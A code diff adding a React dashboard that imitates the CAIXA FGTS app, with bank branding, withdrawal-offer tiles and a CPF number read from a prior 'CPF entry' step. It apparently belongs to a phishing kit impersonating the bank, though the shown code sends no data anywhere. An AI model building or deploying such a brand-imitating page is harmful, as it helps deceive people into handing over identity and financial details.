@@ -1,0 +1,141 @@
+
+import React, { useEffect, useState } from 'react';
+import { ArrowRight, DollarSign, BarChart3, Calendar, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
+
+const Dashboard = () => {
+  const [username, setUsername] = useState('');
+
+  useEffect(() => {
+    // Get CPF from localStorage which was stored during CPF entry
+    const cpf = localStorage.getItem('userCPF') || '';
+    // Get just the last 4 digits for username if available
+    setUsername(cpf.length >= 4 ? cpf.substring(cpf.length - 4) : 'Olá');
+  }, []);
+
+  return (
+    <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
+      {/* Header */}
+      <div className="p-6 flex justify-between items-center">
+        <div className="text-white font-bold text-xl">FGTS</div>
+        <div className="text-white font-bold text-xl">CAIXA</div>
+      </div>
+
+      {/* Welcome */}
+      <div className="p-6">
+        <div className="text-white text-2xl font-light">Olá</div>
+        <div className="text-white opacity-60 text-lg">{username}</div>
+      </div>
+
+      {/* Main content */}
+      <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
+        <div className="p-6">
+          {/* Meu FGTS */}
+          <div className="mb-6">
+            <h2 className="text-[#005CA9] text-2xl font-bold mb-2">Meu FGTS</h2>
+            <div className="flex justify-between items-center">
+              <div>
+                <span className="text-gray-500">R$</span>
+              </div>
+              <ArrowRight className="text-[#FF8C00]" />
+            </div>
+            <div className="mt-1">
+              <span className="text-[#FF8C00] text-sm">Ver todas suas contas (1)</span>
+            </div>
+          </div>
+
+          {/* SALDO TOTAL */}
+          <div className="bg-white border border-gray-200 rounded-lg p-4 mb-4 flex justify-between items-center shadow-sm">
+            <div className="flex items-center">
+              <div className="bg-[#FF8C00] w-12 h-12 rounded-full flex items-center justify-center mr-3">
+                <BarChart3 className="text-white" />
+              </div>
+              <div>
+                <span className="text-black font-bold">SALDO TOTAL</span>
+                <span className="text-gray-500"> do FGTS</span>
+              </div>
+            </div>
+            <ArrowRight className="text-[#FF8C00]" />
+          </div>
+
+          {/* Two column layout */}
+          <div className="grid grid-cols-2 gap-4 mb-4">
+            {/* Last deposit */}
+            <div className="bg-gray-100 rounded-lg p-4">
+              <div className="text-gray-500 text-sm">O último</div>
+              <div className="text-gray-500 text-sm">depósito foi de</div>
+              <div className="font-bold text-lg">R$</div>
+              <div className="text-[#FF8C00] text-xs mt-2">referente a 07/11/2022</div>
+            </div>
+
+            {/* Saque Extraordinário */}
+            <div className="bg-[#FFAB66] rounded-lg p-4 text-white relative">
+              <div className="font-bold">Saque</div>
+              <div className="font-bold">Extraordinário</div>
+              <div className="text-sm mt-1">FGTS</div>
+              <div className="absolute bottom-2 right-2">
+                <div className="flex items-center">
+                  <DollarSign className="h-5 w-5 mr-1" />
+                  <ArrowRight className="h-5 w-5" />
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Additional options */}
+          <div className="grid grid-cols-2 gap-4">
+            {/* Saque Aniversário */}
+            <div className="bg-[#1E88E5] rounded-lg p-4 text-white relative">
+              <div className="font-bold">Saque</div>
+              <div className="font-bold">Aniversário</div>
+              <div className="text-sm mt-1">do FGTS</div>
+              <div className="absolute bottom-2 right-2">
+                <ArrowRight className="h-5 w-5" />
+              </div>
+            </div>
+
+            {/* Autorizar bancos */}
+            <div className="bg-[#00ACC1] rounded-lg p-4 text-white relative">
+              <div className="font-bold">Autorizar</div>
+              <div className="text-sm">bancos</div>
+              <div className="text-sm">a consultarem</div>
+              <div className="text-sm">seu FGTS</div>
+              <div className="absolute bottom-2 right-2">
+                <ArrowRight className="h-5 w-5" />
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        {/* Bottom Navigation */}
+        <div className="fixed bottom-0 w-full bg-white border-t border-gray-200">
+          <div className="flex justify-around items-center py-3">
+            <div className="flex flex-col items-center text-[#FF8C00]">
+              <Home size={24} />
+              <span className="text-xs mt-1">Principal</span>
+            </div>
+            <div className="flex flex-col items-center text-gray-500">
+              <BarChart3 size={24} />
+              <span className="text-xs mt-1">Meu FGTS</span>
+            </div>
+            <div className="flex flex-col items-center">
+              <div className="bg-[#FF8C00] rounded-full w-12 h-12 flex items-center justify-center">
+                <DollarSign size={24} className="text-white" />
+              </div>
+              <span className="text-xs mt-1 text-[#FF8C00]">Mais Saques</span>
+            </div>
+            <div className="flex flex-col items-center text-gray-500">
+              <HelpCircle size={24} />
+              <span className="text-xs mt-1">Ajuda</span>
+            </div>
+            <div className="flex flex-col items-center text-gray-500">
+              <MoreHorizontal size={24} />
+              <span className="text-xs mt-1">Mais</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+export default Dashboard;
